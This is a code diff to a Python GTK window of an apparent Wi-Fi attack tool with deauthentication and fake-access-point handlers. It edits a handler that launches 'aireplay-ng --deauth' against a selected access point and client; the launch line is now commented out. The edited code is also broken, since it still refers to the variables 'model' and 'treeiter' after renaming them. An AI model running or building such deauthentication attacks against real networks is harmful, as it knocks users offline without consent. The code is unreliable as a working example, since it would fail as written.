@@ -141,12 +141,16 @@ class SelectBSSIDWindow(Gtk.Window):
         print("Refresh BSSID/Client Liste")
 
     def on_button_deauth_clicked(self, widget):
-        selection = self.treeview_ap.get_selection()
-        model, treeiter = selection.get_selected()
+        selection_ap = self.treeview_ap.get_selection()
+        model_ap, treeiter_ap = selection_ap.get_selected()
         print (model[treeiter][0])
+        for client in self.clientAP_list:
+            print (client[1])
+            if client[1] == model_ap[treeiter_ap][0]:
+                print ("True")
         if treeiter is not None:
-            Popen(['aireplay-ng', '--deauth', '10', '-a', model[treeiter][0], '-c', '70:66:55:78:af:d3', 'wlan0mon', '-D'])
-            print (model[treeiter][0])
+            #Popen(['aireplay-ng', '--deauth', '10', '-a', model_ap[treeiter_ap][0], '-c', client[1], 'wlan0mon', '-D'])
+            print (model_ap[treeiter_ap][0])
 
     def on_fakeAP_clicked(self, widget):
         print ("Fake AP start")
